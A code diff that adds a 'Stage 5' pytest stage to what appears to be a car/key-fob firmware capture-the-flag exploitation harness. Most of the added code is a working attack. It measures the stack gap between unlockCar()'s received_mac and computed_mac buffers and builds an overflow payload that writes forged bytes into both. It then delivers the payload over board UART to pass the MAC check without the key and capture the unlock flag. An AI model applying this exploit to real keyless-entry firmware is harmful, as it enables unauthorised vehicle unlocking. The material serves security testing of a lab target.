@@ -111,6 +111,23 @@ attacker with only board-to-board UART access (no debug probe on the
 target) could actually do. Both need RoleConfig(..., test=False) for the car
 (added to conftest.py alongside this file) while the fob stays test=True
 (needs sendBoardMsg).
+
+Stage 5 (THIS FILE, IMPLEMENTED - test_full_mac_bypass_blind, plus the static
+test_mac_gap_static_* checks and test_craft_mac_bypass_payload_shape): the
+"sibling" bug flagged back in overflow_offsets.py's own module docstring -
+same receive_board_message_by_type() call site pattern, but the RESPONSE_MAGIC
+receive rather than UNLOCK_MAGIC, and an entirely different consequence.
+unlockCar()'s received_mac[8] and computed_mac[16] are both plain stack
+locals with nothing enforcing a gap between them; overflow_offsets.py's
+derive_mac_overwrite_offsets() derives exactly how many bytes separate them
+in the compiled frame, and overflow_search.py's _craft_mac_bypass_payload()
+uses that to build a payload that writes the same forged bytes into both
+buffers before memcmp(computed_mac, received_mac, 8) ever runs - passing the
+check for any forged value, no CMAC key needed. No saved-LR corruption, no
+crash, no reentry address, no shellcode: this doesn't hijack control flow at
+all, so this stage runs directly end-to-end (delivery + flag capture) with no
+debug-assisted intermediate step the way Stage 4 needed one to confirm a jump
+target - there's no jump to confirm here.
 """
 
 import shutil
@@ -121,8 +138,8 @@ from pathlib import Path
 import pytest
 
 from conftest import PROJECT_ROOT, RoleConfig, build_binary
-from overflow_offsets import derive_lr_offset_static, derive_reentry_addr
-from overflow_search import find_lr_offset_dynamic, _craft_payload, _craft_rce_payload
+from overflow_offsets import derive_lr_offset_static, derive_reentry_addr, derive_mac_overwrite_offsets
+from overflow_search import find_lr_offset_dynamic, _craft_payload, _craft_rce_payload, _craft_mac_bypass_payload
 import gdb_tools
 import protocol as proto
 
@@ -147,6 +164,9 @@ CAR_ID_D = "770004"  # Stage 2
 CAR_ID_E = "770005"  # Stage 3
 CAR_ID_F = "770006"  # Stage 4a (debug-assisted)
 CAR_ID_G = "770007"  # Stage 4b (blind)
+CAR_ID_H = "770008"  # Stage 5 static (id A)
+CAR_ID_I = "770009"  # Stage 5 static (id B)
+CAR_ID_J = "770010"  # Stage 5 end-to-end
 
 
 def _require_arm_toolchain():
@@ -617,4 +637,157 @@ def test_full_overflow_rce_blind(deploy, hardware_config):
     elf, static_offsets, reentry_addr, payload, car, fob = _prep_rce_test(deploy, hardware_config, CAR_ID_G)
 
     _deliver_rce_payload(fob, payload)
+    _assert_flag_exfiltrated(car, elf)
+
+
+# ============================================================================
+# Stage 5: MAC bypass via adjacent-local overflow (received_mac -> computed_mac)
+# See this file's module docstring for how this differs from Stages 0-4.
+# ============================================================================
+
+def _print_mac_offsets(label: str, offsets) -> None:
+    """Run with -s to see this - pytest swallows print() otherwise."""
+    print(f"{label}: mac_gap={offsets.mac_gap}, mac_len={offsets.mac_len}, "
+          f"payload_len={offsets.payload_len}, reachable={offsets.reachable}")
+
+
+@pytest.mark.parametrize("platform", ["stm32", "tm4c"])
+def test_mac_gap_static_is_car_id_independent(platform):
+    """Stage 5 static half, same reasoning as
+    test_lr_offset_static_is_car_id_independent: unlockCar() never branches
+    on CAR_ID between allocating received_mac/computed_mac and comparing
+    them, so derive_mac_overwrite_offsets() should agree between two builds
+    that differ only in car id."""
+    _require_arm_toolchain()
+
+    elf_a = _build_car_elf(platform, CAR_ID_H)
+    elf_b = _build_car_elf(platform, CAR_ID_I)
+
+    offsets_a = derive_mac_overwrite_offsets(elf_a)
+    offsets_b = derive_mac_overwrite_offsets(elf_b)
+
+    _print_mac_offsets(f"[{platform}] id={CAR_ID_H}", offsets_a)
+    _print_mac_offsets(f"[{platform}] id={CAR_ID_I}", offsets_b)
+
+    assert offsets_a == offsets_b, (
+        f"derive_mac_overwrite_offsets() disagreed between car id={CAR_ID_H} and id={CAR_ID_I} "
+        f"on platform={platform}: {offsets_a} vs {offsets_b}"
+    )
+
+
+@pytest.mark.parametrize("platform", ["stm32", "tm4c"])
+def test_mac_gap_static_reports_plausible_values(platform):
+    """Sanity-checks derive_mac_overwrite_offsets()'s output shape: the gap
+    should be small and positive (received_mac[8] and computed_mac[16] are
+    both tiny, function-local buffers with a bit of intervening state at
+    most - nowhere near the 64-byte-buffer-plus-frame-housekeeping magnitude
+    unlockCar()'s LR slot sits at), and mac_len should match the compare
+    width actually used in car.c."""
+    _require_arm_toolchain()
+
+    offsets = derive_mac_overwrite_offsets(_build_car_elf(platform, CAR_ID_H))
+
+    _print_mac_offsets(f"[{platform}] id={CAR_ID_H}", offsets)
+
+    assert 8 <= offsets.mac_gap < 64, (
+        f"mac_gap={offsets.mac_gap} is outside the plausible range for two small, adjacent "
+        f"stack locals on platform={platform} - see this test's docstring"
+    )
+    assert offsets.mac_len == 8
+    assert offsets.reachable, (
+        f"mac_gap={offsets.mac_gap} payload isn't reachable via a uint8_t message_len on "
+        f"platform={platform} - this bug is supposed to be trivially exploitable at this scale"
+    )
+
+
+def test_mac_gap_static_fails_loudly_on_missing_function():
+    """Same "fails loudly" contract as derive_lr_offset_static - a typo'd or
+    compiled-out function name should raise a clear assertion, not an opaque
+    error."""
+    _require_arm_toolchain()
+
+    elf = _build_car_elf("stm32", CAR_ID_H)
+    with pytest.raises(AssertionError, match="no disassembly"):
+        derive_mac_overwrite_offsets(elf, func_name="thisFunctionDoesNotExist")
+
+
+def test_craft_mac_bypass_payload_shape():
+    """No-hardware sanity check of overflow_search._craft_mac_bypass_payload()'s
+    byte layout: forged_mac, then junk filling the gap, then forged_mac again
+    landing exactly at mac_gap - independent of whatever real mac_gap Stage 5's
+    static derivation measures on the attached hardware."""
+    payload = _craft_mac_bypass_payload(mac_gap=24, mac_len=8, forged_mac=b"\x41" * 8)
+    assert len(payload) == 32
+    assert payload[:8] == b"\x41" * 8          # forged received_mac
+    assert payload[8:24] == b"A" * 16          # junk filling the gap
+    assert payload[24:32] == b"\x41" * 8       # forged copy landing on computed_mac
+
+    # Default forged_mac (all zero bytes) works identically - any value does,
+    # since both sides of the comparison end up holding the same forgery.
+    default_payload = _craft_mac_bypass_payload(mac_gap=24, mac_len=8)
+    assert len(default_payload) == 32
+    assert default_payload[:8] == default_payload[24:32] == b"\x00" * 8
+
+    # mac_gap == mac_len: forged_mac itself already reaches computed_mac
+    # (junk_len == 0), so the two copies sit back-to-back with nothing between.
+    tight_payload = _craft_mac_bypass_payload(mac_gap=8, mac_len=8, forged_mac=b"B" * 8)
+    assert tight_payload == b"B" * 16
+
+    with pytest.raises(AssertionError, match="smaller than mac_len"):
+        _craft_mac_bypass_payload(mac_gap=4, mac_len=8)
+
+
+def _prep_mac_bypass_test(deploy, hardware_config, car_id: str):
+    """Shared Stage 5 setup: derive the static mac_gap, build the real
+    bypass payload, deploy a production car + its paired fob, and
+    sanity-check the pair (a real, legitimately-credentialed unlock) before
+    the forged one. Returns (elf, mac_offsets, payload, car, fob)."""
+    elf = _build_car_elf(hardware_config.board, car_id)
+    mac_offsets = derive_mac_overwrite_offsets(elf)
+    assert mac_offsets.reachable, (
+        f"mac_gap={mac_offsets.mac_gap} isn't reachable via a uint8_t message_len - can't "
+        f"build a payload that reaches computed_mac"
+    )
+    payload = _craft_mac_bypass_payload(mac_offsets.mac_gap, mac_offsets.mac_len)
+    print(f"[{hardware_config.board}] id={car_id}: mac_gap={mac_offsets.mac_gap}, "
+          f"mac_len={mac_offsets.mac_len}, payload_len={len(payload)}")
+
+    car, fob = deploy(
+        RoleConfig("car", id=car_id, test=False),
+        RoleConfig("paired_fob", id=car_id, pin="123456"),
+    )
+    assert proto.cmd_btn_press(fob, timeout=5.0).success, "Sanity check failed before test"
+    car.serial.reset_input_buffer()  # drop the sanity check's own flag output,
+                                      # so the capture below is only this test's
+
+    return elf, mac_offsets, payload, car, fob
+
+
+def _deliver_mac_bypass_payload(fob, payload: bytes) -> None:
+    """Send a normal (non-oversized) UNLOCK_MAGIC to get a real unlockCar()
+    running and computing a real computed_mac from a real nonce - this
+    attack doesn't need to control that value, only to overwrite it after
+    the fact - then the crafted RESPONSE_MAGIC in place of a real
+    challenge-response answer. Same 0.15s gap as _deliver_rce_payload/
+    _probe() for the same real-hardware entropy-timing reason (see their
+    docstrings)."""
+    proto.cmd_send_board_msg(fob, proto.UNLOCK_MAGIC, b"")
+    time.sleep(0.15)
+    proto.cmd_send_board_msg(fob, proto.RESPONSE_MAGIC, payload)
+
+
+@pytest.mark.hardware_only
+def test_full_mac_bypass_blind(deploy, hardware_config):
+    """Stage 5. See this file's module docstring for how this bug differs
+    from Stages 0-4 (no control-flow hijack, so no debug-assisted
+    intermediate step - this goes straight to the real, blind, wire-delivered
+    attack). Confirms the forged RESPONSE_MAGIC gets treated as a matching
+    MAC with no real CMAC key involved: the car proceeds exactly as it would
+    for a legitimate fob and exfiltrates the real unlock flag over
+    HOST_UART."""
+    _require_arm_toolchain()
+
+    elf, mac_offsets, payload, car, fob = _prep_mac_bypass_test(deploy, hardware_config, CAR_ID_J)
+
+    _deliver_mac_bypass_payload(fob, payload)
     _assert_flag_exfiltrated(car, elf)
